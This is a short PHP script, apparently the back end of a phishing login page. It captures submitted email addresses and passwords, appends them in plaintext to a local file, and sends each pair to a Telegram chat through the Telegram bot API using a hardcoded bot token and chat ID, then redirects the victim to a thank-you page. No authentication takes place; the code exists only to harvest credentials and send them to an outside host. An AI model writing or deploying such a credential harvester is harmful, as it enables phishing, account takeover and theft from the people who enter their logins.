<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Define the file path where you want to save the login details
    $file = __DIR__ . '/logins.txt'; // Saves in the same directory as login.php
    $content = "Email: " . $email . "\nPassword: " . $password . "\n\n";

    // Write login details to the file
    file_put_contents($file, $content, FILE_APPEND | LOCK_EX);

    // Telegram Bot Details
    $botToken = "7332740324:AAG565EiVXKCJLM83VKm1Fxy8x0A5DzFIl"; // Replace with your bot token
    $chatId = "6410691929"; // Replace with your chat ID

    // Create the message
    $message = "🔐 New Login Attempt:\n\n📧 Email: $email\n🔑 Password: $password";

    // Send message to Telegram
    $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    // Send request to Telegram API
    file_get_contents($telegramUrl . "?" . http_build_query($params));

    // Redirect to thank-you page after form submission
    header('Location: thank-you.html');
    exit();
}
?>
